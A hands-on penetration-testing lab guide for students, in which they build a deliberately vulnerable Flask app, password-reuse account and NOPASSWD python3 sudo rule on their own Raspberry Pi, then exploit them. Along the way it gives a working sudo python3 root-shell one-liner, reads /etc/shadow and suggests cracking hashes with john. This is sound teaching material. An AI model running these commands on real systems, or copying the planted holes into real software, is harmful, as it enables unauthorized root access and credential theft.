# Lab 07: Break In, Level Up — System Compromise on a Single Device
### Cybersecurity & Networking Essentials | Raspberry Pi Lab Series

---

## What Are We Doing?

So far in this series, you have been thinking like a **defender** — blocking ads, analyzing traffic, scanning for vulnerabilities, detecting intrusions. Today, you switch roles.

For this lab, you are a **penetration tester** — someone a company pays to attack their own systems before real criminals do. Your target is a deliberately vulnerable environment running right on your own Raspberry Pi. Everything stays on your device. Nothing you do leaves your Pi.

You will move through four stages that real-world attackers follow:

```
Stage 1: Reconnaissance  →  What is running? What can I see?
Stage 2: Initial Access  →  Can I get in?
Stage 3: Escalation      →  Can I get more access than I should?
Stage 4: Compromise      →  Full control achieved.
```

This is what a real penetration test looks like — in miniature, in a safe, controlled environment, with your full permission.

---

## Learning Objectives

By the end of this lab, you will be able to:

- [ ] Explain the phases of a penetration test
- [ ] Use Nmap to identify open ports and running services on a local target
- [ ] Identify a credential exposure vulnerability in a web application's source code
- [ ] Use SSH to access a system with discovered credentials
- [ ] Enumerate sudo permissions and identify a privilege escalation vector
- [ ] Exploit a misconfigured sudo rule to gain root access
- [ ] Document findings in a professional penetration test format

---

> **Certification Alignment**
> Skills in this lab map to the following industry certifications:
> - **CompTIA PenTest+ (PT0-002):** 3.1 — Research attack vectors and perform network attacks · 3.2 — Research attack vectors and perform service exploitation · 3.4 — Perform post-exploitation techniques
> - **CompTIA Security+ (SY0-701):** 4.3 — Explain various activities associated with vulnerability management · 4.4 — Use appropriate tools to assess organizational security (penetration testing)
> - **CompTIA CySA+ (CS0-003):** 2.5 — Explain the importance of vulnerability management activities · 1.3 — Given a scenario, use appropriate tools or techniques to determine malicious activity

---

## Background Knowledge

### What is a Penetration Test?

A **penetration test** (or "pentest") is an authorized, simulated attack on a system. Companies hire penetration testers to find their weaknesses before criminals do. The key word is **authorized** — you have been given explicit permission to attack this specific target. Without that authorization, the exact same actions would be illegal.

> **Important:** Everything in this lab targets services running on your own Raspberry Pi at `localhost` (127.0.0.1). You are attacking your own device. Never attempt these techniques against systems you do not have explicit permission to test.

### The Four-Phase Attack Lifecycle

Professional penetration testers follow a repeatable methodology. Today's lab maps to four of the most critical phases:

```
Reconnaissance → Initial Access → Privilege Escalation → Post-Exploitation
```

Each phase builds on the last. You cannot escalate privileges until you have access. You cannot gain access until you know what services are running. The phases are not random — they follow a logical, methodical path.

### Localhost and the Loopback Interface

`localhost` is a special hostname that always refers to **your own machine**. Its IP address is always `127.0.0.1`. When you scan or connect to `localhost`, the traffic never leaves your device — it loops back internally.

This makes it perfect for a contained lab: your "attacks" happen internally with zero risk to any other system on the network.

---

## Lab Requirements

| Item | Details |
|------|---------|
| Hardware | Raspberry Pi 4 (any RAM) |
| OS | Raspberry Pi OS (64-bit) |
| Software | Docker & Docker Compose, Python 3, nmap, SSH |
| Network | Not required — all traffic stays on localhost |
| Prior Labs | Lab 03 (Nmap) recommended |
| Time | ~60–90 minutes |

---

## Pre-Lab Setup: Build the Vulnerable Target

Before starting the penetration test, you need to create the target environment. This is an important part of the learning experience — understanding **how** vulnerabilities are created helps you recognize and fix them in real systems.

You will build:
- A vulnerable web application running on port 8080
- A local user account with a weak password
- A deliberately misconfigured `sudo` rule

> **Why are we setting this up ourselves?**
> Security professionals call this "standing up a test bed." Understanding how misconfigured systems are created is just as important as exploiting them — because your job as a defender is to find and fix exactly these kinds of mistakes.

---

### Step 0.1 — Create the Lab Directory

```bash
mkdir -p ~/lab-07-target/webapp
cd ~/lab-07-target
```

Expected output:
```
(no output — directory created silently)
```

---

### Step 0.2 — Create the Vulnerable Web Application

We will build a web app with a real-world vulnerability baked in: **credentials left in an HTML comment**. This is a surprisingly common developer mistake — notes left behind in the source code that are invisible in the browser but readable by anyone who views the page source.

```bash
nano ~/lab-07-target/webapp/app.py
```

Paste the following code exactly:

```python
from flask import Flask, request, redirect, render_template_string, session
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head>
  <title>Internal Admin Portal</title>
  <style>
    body   { font-family: monospace; background: #1a1a2e; color: #eee;
             display: flex; justify-content: center; align-items: center;
             height: 100vh; margin: 0; }
    .box   { background: #16213e; padding: 40px; border: 1px solid #0f3460; width: 300px; }
    h2     { color: #e94560; text-align: center; }
    input  { width: 100%; padding: 8px; margin: 8px 0; background: #0f3460;
             color: #eee; border: 1px solid #e94560; box-sizing: border-box; }
    button { width: 100%; padding: 10px; background: #e94560; color: white;
             border: none; cursor: pointer; margin-top: 10px; }
    .error { color: #e94560; text-align: center; }
  </style>
</head>
<body>
  <!-- TODO: remove before production deploy -- admin:admin123 -->
  <div class="box">
    <h2>Admin Portal</h2>
    {% if error %}<p class="error">{{ error }}</p>{% endif %}
    <form method="POST">
      <input type="text"     name="username" placeholder="Username" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">LOGIN</button>
    </form>
  </div>
</body>
</html>
"""

DASHBOARD_PAGE = """
<!DOCTYPE html>
<html>
<head>
  <title>Admin Dashboard</title>
  <style>
    body  { font-family: monospace; background: #1a1a2e; color: #eee; padding: 40px; }
    h2    { color: #e94560; }
    .card { background: #16213e; padding: 20px; border: 1px solid #0f3460; margin: 12px 0; }
    code  { color: #00ff88; }
  </style>
</head>
<body>
  <h2>System Administration Dashboard</h2>
  <div class="card">
    <h3>Server Information</h3>
    <p>Status:          <code>ONLINE</code></p>
    <p>Host:            <code>localhost</code></p>
    <p>Service Account: <code>target</code></p>
    <p>SSH Port:        <code>22</code></p>
  </div>
  <div class="card">
    <h3>Active Services</h3>
    <p><code>OpenSSH   (port 22)   -- RUNNING</code></p>
    <p><code>Web Admin (port 8080) -- RUNNING</code></p>
  </div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        u = request.form.get('username', '')
        p = request.form.get('password', '')
        if u == 'admin' and p == 'admin123':
            session['auth'] = True
            return redirect('/dashboard')
        error = 'Invalid credentials'
    return render_template_string(LOGIN_PAGE, error=error)

@app.route('/dashboard')
def dashboard():
    if not session.get('auth'):
        return redirect('/')
    return render_template_string(DASHBOARD_PAGE)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

Save and exit: press `Ctrl+X`, then `Y`, then `Enter`.

---

### Step 0.3 — Create the Dockerfile

```bash
nano ~/lab-07-target/webapp/Dockerfile
```

Paste the following:

```dockerfile
FROM python:3.11-slim
WORKDIR /app
RUN pip install flask --quiet
COPY app.py .
EXPOSE 8080
CMD ["python", "app.py"]
```

Save and exit (`Ctrl+X` → `Y` → `Enter`).

---

### Step 0.4 — Create the Docker Compose File

```bash
nano ~/lab-07-target/docker-compose.yml
```

Paste the following:

```yaml
version: '3'
services:
  webapp:
    build: ./webapp
    ports:
      - "8080:8080"
    restart: unless-stopped
```

Save and exit.

---

### Step 0.5 — Create the Target System Account

This creates a local user account that will be the SSH target. The account intentionally reuses the same password found in the web application — a common real-world mistake called **password reuse**.

```bash
sudo adduser --disabled-password --gecos "" target
echo "target:admin123" | sudo chpasswd
```

Expected output:
```
Adding user `target' ...
Adding new group `target' (1001) ...
Adding new user `target' (1001) with group `target' ...
Creating home directory `/home/target' ...
Copying files from `/etc/skel' ...
```

> **What is `--gecos ""`?**
> GECOS fields store optional user information (full name, room number, phone). Passing an empty string skips those prompts so the command runs non-interactively.

---

### Step 0.6 — Add the Sudo Misconfiguration

This creates the privilege escalation vulnerability you will exploit in Stage 3. It grants the `target` user the ability to run `python3` as root with no password — a classic misconfiguration that appears in real systems when administrators take shortcuts.

```bash
echo "target ALL=(ALL) NOPASSWD: /usr/bin/python3" | sudo tee /etc/sudoers.d/lab07-target > /dev/null
sudo chmod 440 /etc/sudoers.d/lab07-target
```

Expected output:
```
(no output — rule saved silently)
```

---

### Step 0.7 — Start the Web Application

```bash
cd ~/lab-07-target
docker compose up -d --build
```

Expected output:
```
[+] Building 14.2s (8/8) FINISHED
[+] Running 1/1
 ✔ Container lab-07-target-webapp-1  Started
```

> **If you see `docker: command not found`:** Run `sudo systemctl start docker` and try again.

---

### Step 0.8 — Verify the Environment

```bash
docker compose ps
```

Expected output:
```
NAME                          STATUS    PORTS
lab-07-target-webapp-1        Up        0.0.0.0:8080->8080/tcp
```

Confirm SSH is running:

```bash
sudo systemctl status ssh
```

Look for `Active: active (running)`. If SSH is not running:

```bash
sudo systemctl enable ssh && sudo systemctl start ssh
```

> **Checkpoint 0:** You should have a web application at `http://localhost:8080` and SSH listening on port 22. The vulnerable environment is ready. Time to attack it.

---

## Stage 1: Reconnaissance

*"Know your target before you attack it."*

Every penetration test begins with **reconnaissance** — gathering information about the target before attempting any exploits. In this stage, you will use Nmap to map out what is running on your system. You are looking for open doors.

### How Port Scanning Works

When Nmap scans a host, it sends packets to each port number and analyzes the response. A port can be in one of three states:

```
OPEN     — A service is listening and accepting connections
CLOSED   — No service is running here (but the host is reachable)
FILTERED — A firewall may be blocking the response
```

> **Quick Recap from Lab 03:**
> - Nmap is the industry-standard tool for network discovery and service enumeration
> - The `-sV` flag tells Nmap to probe services and detect their version numbers
> - Scanning `localhost` (127.0.0.1) targets your own machine only

---

### Step 1.1 — Install Nmap (if needed)

```bash
which nmap || sudo apt install nmap -y
```

---

### Step 1.2 — Run a Basic Port Scan

Start with the default scan, which checks the 1,000 most common ports:

```bash
nmap localhost
```

Expected output:
```
Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00036s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.14 seconds
```

You have identified two open ports: **SSH on 22** and a **web service on 8080**. These are your two attack surfaces.

---

### Step 1.3 — Run a Service Version Scan

A basic scan shows which ports are open, but not what software is behind them. The `-sV` flag probes each service to detect its version:

```bash
nmap -sV localhost
```

Expected output:
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2
8080/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.11.x)
```

> **What does this tell us?**
> - **Port 22:** OpenSSH is running — we could log in via SSH if we find valid credentials
> - **Port 8080:** A Python web application is running (Werkzeug is the development server built into Flask)

---

### Step 1.4 — Run an Aggressive Scan

The `-A` flag enables OS detection, version detection, script scanning, and traceroute all at once:

```bash
nmap -A localhost
```

Review the output carefully. Notice how much more information this returns compared to the basic scan.

> **Real-world note:** Aggressive scans generate significantly more traffic and log entries. On a real engagement, this level of scanning is more likely to trigger an intrusion detection system — like the Snort IDS you configured in Lab 04.

> **Checkpoint 1:** Record your findings. You have identified two attack surfaces:
> - Port 22 — OpenSSH (potential SSH access with valid credentials)
> - Port 8080 — Python/Flask web application (potential web vulnerabilities)

---

## Stage 2: Initial Access

*"Every door has a lock. Some locks are weaker than they look."*

With two services identified, your next goal is to get in. You will start with the web application — web apps are notoriously prone to misconfigurations — and use what you find there to gain a shell.

### What is a Source Code Comment Vulnerability?

Developers often leave **notes to themselves** inside code as comments. In HTML, comments begin with `<!--` and end with `-->`. They are invisible in a normal browser view — but anyone who views the raw page source can read every word.

Leaving credentials, internal addresses, or system information in comments is a documented vulnerability class: **CWE-615: Inclusion of Sensitive Information in Source Code Comments**. It appears in real production systems more often than you might expect.

---

### Step 2.1 — Open the Web Application

Open the Chromium browser on your Raspberry Pi and navigate to:

```
http://localhost:8080
```

You should see an admin login portal.

---

### Step 2.2 — View the Page Source

Before attempting to log in, check the page source. Experienced testers always look here first.

Right-click anywhere on the login page and select **View Page Source** — or press `Ctrl+U`.

Scan through the HTML carefully. You are looking for HTML comments (lines starting with `<!--`).

> **What did you find?**
> Somewhere in the source you should see:
> ```html
> <!-- TODO: remove before production deploy -- admin:admin123 -->
> ```
> A developer left credentials in the source code and forgot to remove them before deploying. This is your way in.

---

### Step 2.3 — Log In to the Admin Portal

Return to the login page and use the credentials you found:

- **Username:** `admin`
- **Password:** `admin123`

Click **LOGIN**.

You should now be looking at the Admin Dashboard.

---

### Step 2.4 — Harvest System Information

Read the dashboard carefully. It is displaying internal system information that it should not be sharing with anyone who logs in:

```
Service Account: target
SSH Port:        22
```

> **What does this mean?**
> The web application is leaking the name of a local system account (`target`) and confirming SSH is available on port 22. This is called **information disclosure** — the application is telling us far more than it should. In a real pentest, this kind of data is gold.

---

### Step 2.5 — Test for Password Reuse

One of the most common findings in real penetration tests is **password reuse** — the same password used across multiple systems or accounts. You have the web admin password (`admin123`). Will it also work as the SSH password for the `target` account?

Open a terminal and try:

```bash
ssh target@localhost
```

When prompted:
```
Are you sure you want to continue connecting (yes/no/[fingerprint])?
```

Type `yes` and press `Enter`.

When prompted for a password, enter:
```
admin123
```

Expected output:
```
target@raspberrypi:~$
```

You are now logged in as the `target` user via SSH.

> **What just happened?**
> The same password worked on two completely separate services. This is password reuse — a real vulnerability that appears constantly in professional penetration tests. It is listed in the OWASP Top 10 under broken authentication.

> **Checkpoint 2:** Confirm your current user:
> ```bash
> whoami
> ```
> Expected output: `target`

---

## Stage 3: Privilege Escalation

*"Getting in is only half the job. Getting root is the goal."*

You have a shell on the system, but as a low-privilege user. Most sensitive data and system configurations require **root** (administrator) access. Privilege escalation is the process of moving from a limited account to one with full system control.

### What is sudo?

`sudo` ("superuser do") allows specific users to run commands as root. The rules defining what each user can run are stored in `/etc/sudoers` and the `/etc/sudoers.d/` directory. A misconfigured sudoers entry — especially one granting access to a language interpreter — can be exploited to spawn a root shell.

### What is GTFOBins?

**GTFOBins** (gtfobins.github.io) is a publicly available reference database of Unix binaries that can be exploited when granted elevated permissions. If a user can run `python3` as root via sudo, there is a well-known technique to abuse it for a shell. Security defenders use GTFOBins to audit their own sudo configurations for exactly this kind of risk.

---

### Step 3.1 — Enumerate Sudo Permissions

The first thing to do after gaining a shell is check what the current user is allowed to run as root:

```bash
sudo -l
```

Expected output:
```
Matching Defaults entries for target on raspberrypi:
    env_reset, mail_badpass, secure_path=...

User target may run the following commands on raspberrypi:
    (ALL) NOPASSWD: /usr/bin/python3
```

> **What does this mean?**
> The `target` account can run `/usr/bin/python3` as **any user — including root — with no password required**. This is a misconfiguration. Whoever set up this system intended to allow Python scripts to run with elevated privileges, but forgot to restrict which scripts or who could invoke them.

---

### Step 3.2 — Understand the Exploit

Python3 has built-in functions for spawning new processes — including a shell. If we run Python3 as root, we can use it to spawn a root shell:

```
sudo python3  →  runs as root  →  spawns /bin/bash as root  →  root shell
```

The one-liner uses Python's `os` module to make a direct operating system call:

```python
import os; os.system("/bin/bash")
```

---

### Step 3.3 — Execute the Privilege Escalation

Run this command exactly:

```bash
sudo python3 -c "import os; os.system('/bin/bash')"
```

> **What does `-c` mean?**
> The `-c` flag tells Python to execute the string that follows as code, rather than loading a file. This lets us run a one-liner directly from the terminal without creating a script file.

Expected result — notice the prompt change:

```
root@raspberrypi:/home/target#
```

The `$` (regular user) has become `#` (root).

> **Checkpoint 3:** Confirm you are root:
> ```bash
> whoami
> ```
> Expected output: `root`

---

## Stage 4: System Compromise & Documentation

*"Verify your access. Document everything."*

You now have root access. In a real penetration test, this stage is about demonstrating the impact of the vulnerability chain — what could a real attacker do with this access? — and then documenting your findings clearly for the client.

---

### Step 4.1 — Verify Full System Access

As root, you can read any file on the system. The `/etc/shadow` file stores hashed passwords for every local account. Regular users cannot read it. Root can.

```bash
cat /etc/shadow
```

Expected output (excerpt):
```
root:$6$randomsalt$hashedpassword...:19800:0:99999:7:::
target:$6$randomsalt$hashedpassword...:19800:0:99999:7:::
```

> **What does this prove?**
> As root, you can read the password hashes for every account on the system. In a real attack, these hashes could be cracked offline. In a real pentest report, reading `/etc/shadow` demonstrates **critical severity** — it confirms complete system compromise.

---

### Step 4.2 — Create a Proof-of-Compromise File

In professional penetration testing, testers leave a **proof file** — a timestamped file in a privileged location that proves root access was achieved and documents when it happened.

```bash
echo "Compromised by: $(whoami) on $(date)" > /root/PROOF.txt
cat /root/PROOF.txt
```

Expected output:
```
Compromised by: root on Tue Apr  1 10:30:00 UTC 2025
```

---

### Step 4.3 — Map the Full Attack Path

Exit the root shell, then exit the SSH session, to return to your normal terminal:

```bash
exit   # exits root shell → drops back to target user
exit   # exits SSH session → back to your normal terminal
```

Your complete attack chain looked like this:

```
[Recon]       nmap localhost
                → Port 22: OpenSSH
                → Port 8080: Flask web app
                        ↓
[Web Exploit] view-source:http://localhost:8080
                → HTML comment: admin:admin123 (CWE-615)
                        ↓
[Web Login]   Logged in as admin → dashboard reveals:
                → Service account: target
                → SSH on port 22
                        ↓
[SSH Access]  ssh target@localhost / admin123
                → Password reuse across services (CWE-1273)
                        ↓
[Enumeration] sudo -l
                → NOPASSWD: /usr/bin/python3 (CWE-269)
                        ↓
[Escalation]  sudo python3 -c "import os; os.system('/bin/bash')"
                        ↓
[Compromise]  whoami → root ✓   |   cat /etc/shadow ✓
```

---

### Step 4.4 — Write Your Findings Summary

A penetration test without a report is just breaking things. In your lab notes, write a findings summary using this professional format:

```
PENETRATION TEST FINDINGS SUMMARY
==================================
Target:   localhost (Raspberry Pi)
Date:     [today's date]
Tester:   [your name]

FINDING 1 — CRITICAL
---------------------
Vulnerability:  Credentials exposed in HTML source comment (CWE-615)
Location:       http://localhost:8080 (view page source)
Impact:         Provided valid admin credentials (admin:admin123)
Remediation:    Never store credentials in source code. Use environment
                variables or a secrets manager.

FINDING 2 — HIGH
-----------------
Vulnerability:  Password reuse across services (CWE-1273)
Location:       SSH service (port 22), user account: target
Impact:         Web application credentials granted SSH shell access
Remediation:    Enforce unique passwords per service and account.
                Consider SSH key-based authentication only.

FINDING 3 — CRITICAL
---------------------
Vulnerability:  Sudo misconfiguration — NOPASSWD interpreter access (CWE-269)
Location:       /etc/sudoers.d/lab07-target
Impact:         Low-privilege user escalated to root via python3
Remediation:    Never grant NOPASSWD sudo access to interpreters
                (python3, perl, bash, ruby, etc.). Apply principle
                of least privilege.

OVERALL RISK RATING: CRITICAL
Full system compromise achieved via three chained vulnerabilities.
```

---

## Lab Cleanup

When you are done, remove the vulnerable environment. Leaving misconfigured services running — even on a local lab machine — is a security risk.

```bash
# Stop and remove the Docker container and image
cd ~/lab-07-target
docker compose down --rmi all

# Remove the target user account and home directory
sudo deluser --remove-home target

# Remove the sudo misconfiguration
sudo rm /etc/sudoers.d/lab07-target

# Remove lab files
rm -rf ~/lab-07-target

# Remove the proof file
sudo rm -f /root/PROOF.txt

echo "Cleanup complete."
```

> **Good habit:** Always clean up test environments when finished. In a professional context, leaving test accounts or misconfigured rules behind after an engagement is itself a finding.

---

## Reflection Questions

Answer these in your own words:

1. **Why do penetration testers follow a structured methodology rather than trying attacks randomly?** What would be the risk of an unstructured approach?

2. **What is the difference between a vulnerability and an exploit?** Give a specific example of each from this lab.

3. **Three vulnerabilities were chained together to achieve root access.** Which one do you think was the most critical to fix, and why? Could the attack have succeeded if only that one was patched?

4. **The `sudo -l` command exposed the misconfiguration immediately.** What does this tell you about the importance of running enumeration commands after gaining initial access?

5. **How does GTFOBins demonstrate the concept of "living off the land"?** Why is this technique harder to detect than bringing in external attack tools?

---

## Bonus Challenges

**Challenge 1 — Scan All Ports**
Run `nmap -p 1-65535 localhost` to scan every TCP port instead of just the common 1,000. How does the result differ? What does this tell you about what the default scan misses?

**Challenge 2 — Crack the Hash**
The `/etc/shadow` output contains a password hash starting with `$6$`. Research what the `$6$` prefix means. What hashing algorithm is it? Install `john` (`sudo apt install john -y`) and attempt to crack the `target` account hash using a wordlist. What does this tell you about password complexity?

**Challenge 3 — Patch the Vulnerability**
After cleanup, recreate only the sudo misconfiguration. Then fix it the right way: research the **principle of least privilege** and rewrite the sudoers rule so `target` can only run one specific Python script — not the Python interpreter itself. Verify that your fix prevents the GTFOBins escalation while still allowing the intended script to run.

---

## Troubleshooting

| Problem | Likely Cause | Fix |
|---------|--------------|-----|
| `docker compose up` fails with error | Docker not running | `sudo systemctl start docker` |
| `http://localhost:8080` won't load | Container not started | `cd ~/lab-07-target && docker compose ps` |
| HTML comment not visible | Viewing rendered page, not source | Press `Ctrl+U` to view raw source |
| `ssh target@localhost` — Connection refused | SSH service not running | `sudo systemctl start ssh` |
| `ssh target@localhost` — Permission denied | Incorrect password | Re-enter password carefully (no extra spaces) |
| `sudo -l` shows nothing for target | Step 0.6 was skipped | Re-run Step 0.6, then re-login via SSH |
| Root prompt looks identical to regular user | Prompt style varies by config | Run `whoami` to confirm — output should be `root` |
| `cat /etc/shadow` shows Permission denied | Not in root shell yet | Re-run Step 3.3 and confirm `whoami` returns `root` |
| `docker compose down` fails | Already stopped | Run `docker ps -a` to check container state |

---

## Glossary

| Term | Definition |
|------|-----------|
| **Penetration test** | An authorized, simulated attack to find and document security weaknesses |
| **Reconnaissance** | The information-gathering phase — understanding the target before attacking |
| **Localhost** | A hostname (127.0.0.1) that always refers to your own machine |
| **Port** | A numbered endpoint on a device; services listen on specific port numbers |
| **SSH** | Secure Shell — a protocol for encrypted remote terminal access |
| **CWE** | Common Weakness Enumeration — a standardized catalog of security weaknesses |
| **Information disclosure** | A vulnerability where a system reveals data it should keep private |
| **Password reuse** | Using the same password for multiple services or accounts |
| **Privilege escalation** | Moving from a limited account to one with higher permissions |
| **sudo** | A Linux command that lets permitted users run commands as root |
| **sudoers** | The configuration file defining what each user can run with sudo |
| **NOPASSWD** | A sudo rule option that skips password prompts — dangerous when misapplied |
| **GTFOBins** | A reference of Unix binaries that can be exploited for privilege escalation |
| **Root** | The superuser account on Linux/Unix with unrestricted system access |
| **Proof file** | A file left in a privileged location documenting that compromise occurred |
| **Living off the land** | Using tools already present on the target system rather than importing new ones |

---

> **Next Up: Lab 08 — coming soon**
